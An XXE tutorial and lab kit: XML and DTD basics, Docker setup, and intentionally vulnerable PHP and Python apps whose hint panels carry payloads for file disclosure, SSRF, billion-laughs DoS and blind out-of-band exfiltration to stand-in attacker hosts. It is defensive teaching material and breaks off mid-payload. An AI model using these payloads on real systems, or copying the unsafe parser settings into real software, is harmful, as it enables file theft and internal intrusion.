# Complete XXE (XML External Entity) Attack Study Guide

## Part 1: XML Fundamentals You MUST Understand First

### 1.1 What is XML?

```
XML = eXtensible Markup Language
- A format for storing and transporting data
- Human-readable and machine-readable
- Uses tags to define structure
```

### 1.2 Basic XML Structure

```xml
<?xml version="1.0" encoding="UTF-8"?>   <!-- XML Declaration -->
<root>                                     <!-- Root Element -->
    <child attribute="value">              <!-- Child Element with Attribute -->
        <subchild>Text Content</subchild>  <!-- Nested Element -->
    </child>
</root>
```

### 1.3 XML Syntax Rules

```xml
<!-- Rule 1: Must have ONE root element -->
<root>
    <item>Everything must be inside root</item>
</root>

<!-- Rule 2: Tags are case-sensitive -->
<Name>John</Name>     <!-- Correct -->
<name>John</NAME>     <!-- WRONG! -->

<!-- Rule 3: Tags must be properly closed -->
<item>content</item>   <!-- Correct -->
<item>content          <!-- WRONG! -->

<!-- Rule 4: Tags must be properly nested -->
<a><b>text</b></a>     <!-- Correct -->
<a><b>text</a></b>     <!-- WRONG! -->

<!-- Rule 5: Attribute values must be quoted -->
<item id="1">          <!-- Correct -->
<item id=1>            <!-- WRONG! -->
```

---

## Part 2: DTD (Document Type Definition) - THE KEY TO XXE

### 2.1 What is DTD?

```
DTD = Document Type Definition
- Defines the structure/rules for an XML document
- Defines what elements and attributes are allowed
- Most importantly: Defines ENTITIES (this is where XXE happens!)
```

### 2.2 DTD Declaration Types

```xml
<!-- TYPE 1: Internal DTD (inside the XML document) -->
<?xml version="1.0"?>
<!DOCTYPE root [
    <!ELEMENT root (child)>
    <!ELEMENT child (#PCDATA)>
]>
<root>
    <child>Hello</child>
</root>


<!-- TYPE 2: External DTD (separate file) -->
<?xml version="1.0"?>
<!DOCTYPE root SYSTEM "rules.dtd">
<root>
    <child>Hello</child>
</root>


<!-- TYPE 3: Public External DTD -->
<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0//EN" 
    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
```

### 2.3 DTD Element Declarations

```xml
<!DOCTYPE note [
    <!-- Define elements -->
    <!ELEMENT note (to, from, message)>
    <!ELEMENT to (#PCDATA)>         <!-- #PCDATA = Parsed Character Data (text) -->
    <!ELEMENT from (#PCDATA)>
    <!ELEMENT message (#PCDATA)>
    
    <!-- Define attributes -->
    <!ATTLIST note id ID #REQUIRED>
]>
```

---

## Part 3: XML ENTITIES - The Heart of XXE

### 3.1 What are Entities?

```
Entities = Variables/shortcuts in XML
- They store content that can be reused
- Referenced using: &entityname;
- THIS IS WHAT ATTACKERS EXPLOIT!
```

### 3.2 Types of Entities

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
    
    <!-- TYPE 1: Built-in Entities (predefined) -->
    <!-- &lt;   = <  (less than)     -->
    <!-- &gt;   = >  (greater than)  -->
    <!-- &amp;  = &  (ampersand)     -->
    <!-- &apos; = '  (apostrophe)    -->
    <!-- &quot; = "  (quotation)     -->
    
    
    <!-- TYPE 2: Internal General Entity -->
    <!ENTITY myname "John Doe">
    
    
    <!-- TYPE 3: External General Entity (FILE - DANGEROUS!) -->
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
    
    
    <!-- TYPE 4: External General Entity (URL - DANGEROUS!) -->
    <!ENTITY xxe SYSTEM "http://evil.com/malicious.dtd">
    
    
    <!-- TYPE 5: Parameter Entity (used within DTD only) -->
    <!ENTITY % param "some value">
    
]>
<root>
    <name>&myname;</name>     <!-- Outputs: John Doe -->
    <data>&xxe;</data>        <!-- Outputs: contents of /etc/passwd! -->
</root>
```

### 3.3 Entity Keywords Explained

```
SYSTEM = Load from local file system or URL (attacker controlled!)
PUBLIC = Load from public identifier + URL

Protocols that can be used:
- file://      → Read local files
- http://      → Make HTTP requests  
- https://     → Make HTTPS requests
- ftp://       → FTP connections
- php://       → PHP wrappers (if PHP)
- expect://    → Execute commands (if PHP expect module)
- gopher://    → Various protocols
```

---

## Part 4: XXE Attack Types Explained

### 4.1 Classic XXE - Read Local Files

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
    <data>&xxe;</data>
</root>

<!-- Server returns contents of /etc/passwd -->
```

### 4.2 XXE - SSRF (Server-Side Request Forgery)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://internal-server:8080/admin">
]>
<root>
    <data>&xxe;</data>
</root>

<!-- Server makes request to internal network -->
```

### 4.3 Blind XXE - Out-of-Band Data Exfiltration

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
    %dtd;
]>
<root>
    <data>&send;</data>
</root>

<!-- evil.dtd on attacker server: -->
<!-- <!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>"> -->
<!-- %all; -->
```

### 4.4 XXE - Denial of Service (Billion Laughs Attack)

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
    <!ENTITY lol "lol">
    <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
    <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
    <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
    <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
    <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
    <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
    <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>

<!-- Expands to billions of "lol" strings - crashes server! -->
```

---

## Part 5: XXE Lab Environment Setup

### Project Structure

```
xxe-lab/
├── docker-compose.yml
├── php-app/
│   ├── Dockerfile
│   ├── index.php
│   ├── vulnerable.php
│   ├── login.php
│   ├── search.php
│   └── style.css
├── python-app/
│   ├── Dockerfile
│   ├── app.py
│   ├── requirements.txt
│   └── templates/
│       └── index.html
├── java-app/
│   ├── Dockerfile
│   └── XXEServlet.java
├── attacker-server/
│   ├── Dockerfile
│   └── server.py
├── files/
│   ├── secret.txt
│   └── config.xml
└── payloads/
    └── xxe-payloads.txt
```

### docker-compose.yml

```yaml
version: '3.8'

services:
  # Vulnerable PHP Application
  php-xxe:
    build: ./php-app
    container_name: xxe-php-lab
    ports:
      - "8081:80"
    volumes:
      - ./files:/var/secret-files:ro
    networks:
      - xxe-network

  # Vulnerable Python Application  
  python-xxe:
    build: ./python-app
    container_name: xxe-python-lab
    ports:
      - "8082:5000"
    volumes:
      - ./files:/var/secret-files:ro
    networks:
      - xxe-network

  # Attacker's Server (for blind XXE)
  attacker:
    build: ./attacker-server
    container_name: xxe-attacker
    ports:
      - "8888:8888"
    networks:
      - xxe-network

  # Internal Service (for SSRF demonstration)
  internal-api:
    image: nginx:alpine
    container_name: internal-api
    volumes:
      - ./internal-content:/usr/share/nginx/html:ro
    networks:
      - xxe-network
    # No ports exposed - only accessible internally!

networks:
  xxe-network:
    driver: bridge
```

---

### PHP Vulnerable Application

#### php-app/Dockerfile

```dockerfile
FROM php:7.4-apache

# Enable necessary modules
RUN docker-php-ext-install mysqli

# Copy application files
COPY . /var/www/html/

# Create test files
RUN echo "SECRET_API_KEY=sk_live_supersecret123" > /etc/secret.conf && \
    echo "admin:x:0:0:root:/root:/bin/bash" >> /etc/test-passwd && \
    echo "www-data:x:33:33:www-data:/var/www:/bin/bash" >> /etc/test-passwd

# Set permissions
RUN chmod 644 /etc/secret.conf /etc/test-passwd

EXPOSE 80
```

#### php-app/index.php

```php
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XXE Learning Lab - PHP</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <h1>🔓 XXE Vulnerability Lab</h1>
        <p class="subtitle">Educational Environment for Learning XXE Attacks</p>
        
        <div class="warning-box">
            ⚠️ This application is INTENTIONALLY VULNERABLE for educational purposes only!
        </div>

        <div class="lab-section">
            <h2>Lab 1: Basic XXE - File Disclosure</h2>
            <p>Submit XML data to read local files from the server</p>
            <a href="vulnerable.php" class="btn">Start Lab 1</a>
        </div>

        <div class="lab-section">
            <h2>Lab 2: XXE in Login Form</h2>
            <p>XML-based authentication vulnerable to XXE</p>
            <a href="login.php" class="btn">Start Lab 2</a>
        </div>

        <div class="lab-section">
            <h2>Lab 3: XXE in Search Feature</h2>
            <p>Search functionality using XML parser</p>
            <a href="search.php" class="btn">Start Lab 3</a>
        </div>

        <div class="lab-section">
            <h2>Lab 4: Blind XXE</h2>
            <p>XXE without direct output - use out-of-band techniques</p>
            <a href="blind.php" class="btn">Start Lab 4</a>
        </div>

        <div class="help-section">
            <h3>📖 Quick Reference</h3>
            <pre>
Files to try reading:
- /etc/passwd
- /etc/secret.conf
- /var/secret-files/secret.txt
- /var/www/html/config.php

Attacker Server: http://attacker:8888
            </pre>
        </div>
    </div>
</body>
</html>
```

#### php-app/vulnerable.php

```php
<?php
// VULNERABLE CODE - FOR EDUCATIONAL PURPOSES ONLY!

$output = "";
$xmlData = "";
$vulnerability_info = "";

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $xmlData = $_POST['xml'] ?? '';
    
    if (!empty($xmlData)) {
        // VULNERABLE: External entities are enabled (default in older PHP)
        // This is the vulnerability!
        libxml_disable_entity_loader(false);  // Explicitly enable for demo
        
        $doc = new DOMDocument();
        $doc->loadXML($xmlData, LIBXML_NOENT | LIBXML_DTDLOAD);
        
        // Extract and display the parsed content
        $output = $doc->textContent;
        
        $vulnerability_info = "
        <div class='vuln-info'>
            <h4>🐛 Why is this vulnerable?</h4>
            <ul>
                <li>LIBXML_NOENT flag processes external entities</li>
                <li>LIBXML_DTDLOAD allows loading external DTDs</li>
                <li>No input validation on XML data</li>
                <li>Server output reveals file contents</li>
            </ul>
        </div>";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Lab 1: Basic XXE</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <h1>Lab 1: Basic XXE - File Disclosure</h1>
        <a href="index.php" class="back-link">← Back to Labs</a>
        
        <div class="lab-content">
            <h3>📝 Submit XML Data</h3>
            <form method="POST">
                <textarea name="xml" rows="15" cols="80" placeholder="Enter XML here..."><?php echo htmlspecialchars($xmlData); ?></textarea>
                <br><br>
                <button type="submit" class="btn">Parse XML</button>
            </form>

            <?php if (!empty($output)): ?>
            <div class="output-section">
                <h3>📤 Server Response:</h3>
                <pre class="output"><?php echo htmlspecialchars($output); ?></pre>
            </div>
            <?php echo $vulnerability_info; ?>
            <?php endif; ?>

            <div class="hints">
                <h3>💡 Hints & Payloads</h3>
                
                <h4>Normal XML (test if parsing works):</h4>
                <pre class="payload">
&lt;?xml version="1.0"?&gt;
&lt;user&gt;
    &lt;name&gt;John Doe&lt;/name&gt;
    &lt;email&gt;john@example.com&lt;/email&gt;
&lt;/user&gt;</pre>

                <h4>XXE Payload - Read /etc/passwd:</h4>
                <pre class="payload">
&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE foo [
    &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
]&gt;
&lt;root&gt;
    &lt;data&gt;&amp;xxe;&lt;/data&gt;
&lt;/root&gt;</pre>

                <h4>XXE Payload - Read secret config:</h4>
                <pre class="payload">
&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE foo [
    &lt;!ENTITY xxe SYSTEM "file:///etc/secret.conf"&gt;
]&gt;
&lt;root&gt;&amp;xxe;&lt;/root&gt;</pre>

                <h4>XXE Payload - PHP source code (base64):</h4>
                <pre class="payload">
&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE foo [
    &lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=vulnerable.php"&gt;
]&gt;
&lt;root&gt;&amp;xxe;&lt;/root&gt;</pre>

                <h4>XXE - SSRF to internal service:</h4>
                <pre class="payload">
&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE foo [
    &lt;!ENTITY xxe SYSTEM "http://internal-api/secret.html"&gt;
]&gt;
&lt;root&gt;&amp;xxe;&lt;/root&gt;</pre>
            </div>
        </div>
    </div>
</body>
</html>
```

#### php-app/login.php

```php
<?php
$message = "";
$xmlData = "";

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $xmlData = file_get_contents('php://input');
    
    if (empty($xmlData)) {
        // If not raw XML, build from form
        $username = $_POST['username'] ?? '';
        $password = $_POST['password'] ?? '';
        $xmlData = "<?xml version=\"1.0\"?>
<credentials>
    <username>$username</username>
    <password>$password</password>
</credentials>";
    }
    
    // VULNERABLE XML PARSING
    libxml_disable_entity_loader(false);
    $doc = new DOMDocument();
    
    // Suppress errors but still parse
    @$doc->loadXML($xmlData, LIBXML_NOENT | LIBXML_DTDLOAD);
    
    $xpath = new DOMXPath($doc);
    $username = $xpath->query('//username')->item(0)->textContent ?? '';
    $password = $xpath->query('//password')->item(0)->textContent ?? '';
    
    // Simple check (vulnerable to XXE in credentials)
    if ($username === 'admin' && $password === 'password123') {
        $message = "<div class='success'>✅ Login successful! Welcome, $username</div>";
    } else {
        $message = "<div class='error'>❌ Login failed for user: " . htmlspecialchars($username) . "</div>";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Lab 2: XXE in Login</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <h1>Lab 2: XML-Based Login</h1>
        <a href="index.php" class="back-link">← Back to Labs</a>
        
        <div class="lab-content">
            <h3>🔐 Login Form</h3>
            <p>This login system uses XML to transmit credentials</p>
            
            <form method="POST" class="login-form">
                <label>Username:</label>
                <input type="text" name="username" value="admin">
                <label>Password:</label>
                <input type="password" name="password" value="wrongpassword">
                <button type="submit" class="btn">Login</button>
            </form>

            <?php echo $message; ?>

            <div class="hints">
                <h3>💡 Attack Strategy</h3>
                <p>The username is reflected in the error message. Inject XXE in the username field!</p>
                
                <h4>Use Burp/curl to send raw XML:</h4>
                <pre class="payload">
POST /login.php HTTP/1.1
Content-Type: application/xml

&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE creds [
    &lt;!ENTITY xxe SYSTEM "file:///etc/secret.conf"&gt;
]&gt;
&lt;credentials&gt;
    &lt;username&gt;&amp;xxe;&lt;/username&gt;
    &lt;password&gt;anything&lt;/password&gt;
&lt;/credentials&gt;</pre>

                <h4>curl command:</h4>
                <pre class="payload">
curl -X POST http://localhost:8081/login.php \
  -H "Content-Type: application/xml" \
  -d '&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE creds [
  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
]&gt;
&lt;credentials&gt;
  &lt;username&gt;&amp;xxe;&lt;/username&gt;
  &lt;password&gt;test&lt;/password&gt;
&lt;/credentials&gt;'</pre>
            </div>
        </div>
    </div>
</body>
</html>
```

#### php-app/search.php

```php
<?php
$results = [];
$searchTerm = "";
$rawXml = "";

// Sample product database
$products = [
    ['id' => 1, 'name' => 'Laptop', 'price' => 999],
    ['id' => 2, 'name' => 'Phone', 'price' => 699],
    ['id' => 3, 'name' => 'Tablet', 'price' => 499],
    ['id' => 4, 'name' => 'Headphones', 'price' => 199],
];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $rawXml = file_get_contents('php://input');
    
    if (!empty($rawXml)) {
        // VULNERABLE XML PARSING
        libxml_disable_entity_loader(false);
        $doc = new DOMDocument();
        @$doc->loadXML($rawXml, LIBXML_NOENT | LIBXML_DTDLOAD);
        
        $xpath = new DOMXPath($doc);
        $searchNode = $xpath->query('//query')->item(0);
        $searchTerm = $searchNode ? $searchNode->textContent : '';
    }
    
    // Search products
    foreach ($products as $product) {
        if (empty($searchTerm) || stripos($product['name'], $searchTerm) !== false) {
            $results[] = $product;
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Lab 3: XXE in Search</title>
    <link rel="stylesheet" href="style.css">
    <script>
        function performSearch() {
            const query = document.getElementById('searchInput').value;
            const xml = `<?xml version="1.0"?>
<search>
    <query>${query}</query>
</search>`;
            
            fetch('/search.php', {
                method: 'POST',
                headers: {'Content-Type': 'application/xml'},
                body: xml
            })
            .then(response => response.text())
            .then(html => {
                document.getElementById('results').innerHTML = html;
            });
        }
    </script>
</head>
<body>
    <div class="container">
        <h1>Lab 3: Product Search (XXE)</h1>
        <a href="index.php" class="back-link">← Back to Labs</a>
        
        <div class="lab-content">
            <h3>🔍 Search Products</h3>
            <p>Search uses XML API under the hood</p>
            
            <input type="text" id="searchInput" placeholder="Search products...">
            <button onclick="performSearch()" class="btn">Search</button>

            <div id="results">
                <?php if (!empty($searchTerm)): ?>
                <p>Search results for: <strong><?php echo htmlspecialchars($searchTerm); ?></strong></p>
                <?php endif; ?>
                
                <?php if (!empty($results)): ?>
                <table class="results-table">
                    <tr><th>ID</th><th>Product</th><th>Price</th></tr>
                    <?php foreach ($results as $p): ?>
                    <tr>
                        <td><?php echo $p['id']; ?></td>
                        <td><?php echo $p['name']; ?></td>
                        <td>$<?php echo $p['price']; ?></td>
                    </tr>
                    <?php endforeach; ?>
                </table>
                <?php endif; ?>
            </div>

            <div class="hints">
                <h3>💡 Attack with Burp Suite</h3>
                <p>Intercept the XML request and inject XXE payload</p>
                
                <pre class="payload">
&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE search [
    &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
]&gt;
&lt;search&gt;
    &lt;query&gt;&amp;xxe;&lt;/query&gt;
&lt;/search&gt;</pre>
            </div>
        </div>
    </div>
</body>
</html>
```

#### php-app/blind.php

```php
<?php
$status = "";

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $xmlData = file_get_contents('php://input');
    
    if (!empty($xmlData)) {
        // VULNERABLE - but no output shown!
        libxml_disable_entity_loader(false);
        $doc = new DOMDocument();
        @$doc->loadXML($xmlData, LIBXML_NOENT | LIBXML_DTDLOAD);
        
        // Process XML but don't show content
        $status = "XML processed successfully";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Lab 4: Blind XXE</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <h1>Lab 4: Blind XXE</h1>
        <a href="index.php" class="back-link">← Back to Labs</a>
        
        <div class="lab-content">
            <div class="warning-box">
                ⚠️ This endpoint processes XML but does NOT return the content!
                You must use Out-of-Band (OOB) techniques.
            </div>

            <h3>📤 Submit XML</h3>
            <form method="POST" id="xxeForm">
                <textarea name="xml" id="xmlInput" rows="15" cols="80"></textarea>
                <br><br>
                <button type="button" onclick="sendXXE()" class="btn">Send XML</button>
            </form>

            <div id="status"></div>

            <script>
                function sendXXE() {
                    fetch('/blind.php', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/xml'},
                        body: document.getElementById('xmlInput').value
                    })
                    .then(r => r.text())
                    .then(t => document.getElementById('status').innerHTML = '<p class="success">Request sent! Check attacker server.</p>');
                }
            </script>

            <div class="hints">
                <h3>💡 Blind XXE Strategy</h3>
                
                <h4>Step 1: Create malicious DTD on attacker server</h4>
                <pre class="payload">
# On attacker server (http://attacker:8888/evil.dtd):
&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://attacker:8888/collect?data=%file;'&gt;"&gt;
%eval;
%exfil;</pre>

                <h4>Step 2: Send XXE payload referencing your DTD</h4>
                <pre class="payload">
&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE foo [
    &lt;!ENTITY % xxe SYSTEM "http://attacker:8888/evil.dtd"&gt;
    %xxe;
]&gt;
&lt;root&gt;test&lt;/root&gt;</pre>

                <h4>Step 3: Check attacker server logs for exfiltrated data</h4>
                <p>Visit: http://localhost:8888/logs</p>
            </div>
        </div>
    </div>
</body>
</html>
```

#### php-app/style.css

```css
* {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
}

body {
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
    min-height: 100vh;
    color: #eee;
    padding: 20px;
}

.container {
    max-width: 1000px;
    margin: 0 auto;
}

h1 {
    text-align: center;
    color: #00ff88;
    margin-bottom: 10px;
    text-shadow: 0 0 20px rgba(0, 255, 136, 0.3);
}

.subtitle {
    text-align: center;
    color: #888;
    margin-bottom: 30px;
}

.warning-box {
    background: #ff6b6b22;
    border: 1px solid #ff6b6b;
    border-radius: 8px;
    padding: 15px;
    margin-bottom: 30px;
    text-align: center;
    color: #ff6b6b;
}

.lab-section {
    background: #ffffff11;
    border-radius: 12px;
    padding: 20px;
    margin-bottom: 20px;
    border-left: 4px solid #00ff88;
}

.lab-section h2 {
    color: #00ff88;
    margin-bottom: 10px;
}

.btn {
    background: linear-gradient(135deg, #00ff88, #00cc6a);
    color: #1a1a2e;
    border: none;
    padding: 12px 30px;
    border-radius: 25px;
    font-weight: bold;
    cursor: pointer;
    text-decoration: none;
    display: inline-block;
    transition: transform 0.2s, box-shadow 0.2s;
}

.btn:hover {
    transform: translateY(-2px);
    box-shadow: 0 5px 20px rgba(0, 255, 136, 0.4);
}

textarea, input[type="text"], input[type="password"] {
    width: 100%;
    padding: 15px;
    border-radius: 8px;
    border: 1px solid #333;
    background: #0a0a1a;
    color: #00ff88;
    font-family: 'Courier New', monospace;
    font-size: 14px;
}

.output-section {
    margin-top: 20px;
    background: #0a0a1a;
    border-radius: 8px;
    padding: 20px;
    border: 1px solid #00ff8844;
}

.output {
    background: #000;
    padding: 15px;
    border-radius: 5px;
    overflow-x: auto;
    white-space: pre-wrap;
    word-wrap: break-word;
    color: #0f0;
}

.hints {
    margin-top: 30px;
    background: #ffffff08;
    border-radius: 8px;
    padding: 20px;
}

.hints h3 {
    color: #ffd700;
    margin-bottom: 15px;
}

.hints h4 {
    color: #00bfff;
    margin: 15px 0 10px 0;
}

.payload {
    background: #0a0a1a;
    padding: 15px;
    border-radius: 5px;
    overflow-x: auto;
    font-size: 13px;
    border-left: 3px solid #ffd700;
    color: #aaffaa;
}

.back-link {
    color: #00ff88;
    text-decoration: none;
    display: inline-block;
    margin-bottom: 20px;
}

.help-section {
    background: #ffffff08;
    border-radius: 8px;
    padding: 20px;
    margin-top: 20px;
}

.help-section pre {
    background: #0a0a1a;
    padding: 15px;
    border-radius: 5px;
    color: #888;
}

.login-form {
    max-width: 400px;
}

.login-form label {
    display: block;
    margin: 10px 0 5px;
}

.login-form input {
    margin-bottom: 10px;
}

.success {
    color: #00ff88;
    padding: 15px;
    background: #00ff8822;
    border-radius: 8px;
    margin-top: 15px;
}

.error {
    color: #ff6b6b;
    padding: 15px;
    background: #ff6b6b22;
    border-radius: 8px;
    margin-top: 15px;
}

.vuln-info {
    background: #ff6b6b22;
    border: 1px solid #ff6b6b;
    border-radius: 8px;
    padding: 15px;
    margin-top: 20px;
}

.vuln-info h4 {
    color: #ff6b6b;
    margin-bottom: 10px;
}

.vuln-info li {
    margin-left: 20px;
    margin-bottom: 5px;
}

.results-table {
    width: 100%;
    border-collapse: collapse;
    margin-top: 15px;
}

.results-table th, .results-table td {
    padding: 10px;
    border: 1px solid #333;
    text-align: left;
}

.results-table th {
    background: #00ff8833;
    color: #00ff88;
}
```

---

### Python Vulnerable Application

#### python-app/Dockerfile

```dockerfile
FROM python:3.9-slim

WORKDIR /app

COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY . .

# Create test files
RUN echo "PYTHON_SECRET_KEY=py_secret_key_12345" > /etc/python-secret.conf

EXPOSE 5000

CMD ["python", "app.py"]
```

#### python-app/requirements.txt

```
flask==2.0.1
lxml==4.6.3
defusedxml==0.7.1
```

#### python-app/app.py

```python
from flask import Flask, request, render_template, jsonify
from lxml import etree
import os

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')


@app.route('/vulnerable', methods=['POST'])
def vulnerable_endpoint():
    """
    VULNERABLE ENDPOINT - DO NOT USE IN PRODUCTION!
    This demonstrates XXE vulnerability in Python/lxml
    """
    xml_data = request.data
    
    try:
        # VULNERABLE: resolve_entities=True allows XXE!
        parser = etree.XMLParser(
            resolve_entities=True,  # DANGEROUS!
            load_dtd=True,          # DANGEROUS!
            no_network=False        # DANGEROUS!
        )
        
        doc = etree.fromstring(xml_data, parser)
        result = etree.tostring(doc, encoding='unicode')
        
        return jsonify({
            'status': 'success',
            'parsed_content': result,
            'text_content': doc.text or ''.join(doc.itertext())
        })
        
    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': str(e)
        }), 400


@app.route('/secure', methods=['POST'])
def secure_endpoint():
    """
    SECURE ENDPOINT - Demonstrates proper XXE prevention
    """
    xml_data = request.data
    
    try:
        # SECURE: Disable all dangerous features
        parser = etree.XMLParser(
            resolve_entities=False,  # SAFE
            no_network=True,         # SAFE
            dtd_validation=False,    # SAFE
            load_dtd=False           # SAFE
        )
        
        doc = etree.fromstring(xml_data, parser)
        result = etree.tostring(doc, encoding='unicode')
        
        return jsonify({
            'status': 'success',
            'parsed_content': result,
            'message': 'Parsed securely - XXE blocked'
        })
        
    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': str(e)
        }), 400


@app.route('/api/user', methods=['POST'])
def api_user():
    """
    Simulated API endpoint that accepts XML user data
    VULNERABLE to XXE
    """
    xml_data = request.data
    
    try:
        parser = etree.XMLParser(resolve_entities=True, load_dtd=True)
        doc = etree.fromstring(xml_data, parser)
        
        # Extract user info
        username = doc.find('.//username')
        email = doc.find('.//email')
        
        return jsonify({
            'status': 'success',
            'user': {
                'username': username.text if username is not None else None,
                'email': email.text if email is not None else None
            }
        })
        
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 400


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
```

#### python-app/templates/index.html

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XXE Lab - Python/lxml</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 900px;
            margin: 0 auto;
            padding: 20px;
            background: #1a1a2e;
            color: #eee;
        }
        h1 { color: #00ff88; text-align: center; }
        .section {
            background: #16213e;
            border-radius: 8px;
            padding: 20px;
            margin: 20px 0;
        }
        textarea {
            width: 100%;
            height: 200px;
            background: #0f0f23;
            color: #00ff88;
            border: 1px solid #333;
            padding: 10px;
            font-family: monospace;
        }
        button {
            background: #00ff88;
            color: #1a1a2e;
            border: none;
            padding: 10px 25px;
            cursor: pointer;
            border-radius: 5px;
            margin: 5px;
        }
        button:hover { background: #00cc6a; }
        .response {
            background: #0f0f23;
            padding: 15px;
            border-radius: 5px;
            margin-top: 15px;
            white-space: pre-wrap;
            overflow-x: auto;
        }
        .endpoint-info {
            background: #0f0f23;
            padding: 10px;
            border-left: 3px solid #ff6b6b;
            margin: 10px 0;
        }
        .vulnerable { border-left-color: #ff6b6b; }
        .secure { border-left-color: #00ff88; }
        code {
            background: #000;
            padding: 2px 6px;
            border-radius: 3px;
            color: #ffd700;
        }
    </style>
</head>
<body>
    <h1>🐍 Python XXE Lab (lxml)</h1>
    
    <div class="section">
        <h2>Endpoints</h2>
        <div class="endpoint-info vulnerable">
            <strong>POST /vulnerable</strong> - XXE VULNERABLE (entities enabled)
        </div>
        <div class="endpoint-info secure">
            <strong>POST /secure</strong> - XXE PROTECTED (entities disabled)
        </div>
        <div class="endpoint-info vulnerable">
            <strong>POST /api/user</strong> - Vulnerable API endpoint
        </div>
    </div>

    <div class="section">
        <h2>Test XML Parser</h2>
        <textarea id="xmlInput">&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE foo [
    &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
]&gt;
&lt;root&gt;
    &lt;data&gt;&amp;xxe;&lt;/data&gt;
&lt;/root&gt;</textarea>
        <br>
        <button onclick="sendRequest('/vulnerable')">Send to Vulnerable</button>
        <button onclick="sendRequest('/secure')">Send to Secure</button>
        
        <div class="response" id="response">Response will appear here...</div>
    </div>

    <div class="section">
        <h2>Test Payloads</h2>
        <button onclick="loadPayload('file')">File Read</button>
        <button onclick="loadPayload('ssrf')">SSRF</button>
        <button onclick="loadPayload('dos')">DoS (Careful!)</button>
        <button onclick="loadPayload('normal')">Normal XML</button>
    </div>

    <script>
        const payloads = {
            file: `<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
    <data>&xxe;</data>
</root>`,
            ssrf: `<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://internal-api/secret.html">
]>
<root>&xxe;</root>`,
            dos: `<?xml version="1.0"?>
<!DOCTYPE lolz [
    <!ENTITY lol "lol">
    <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;">
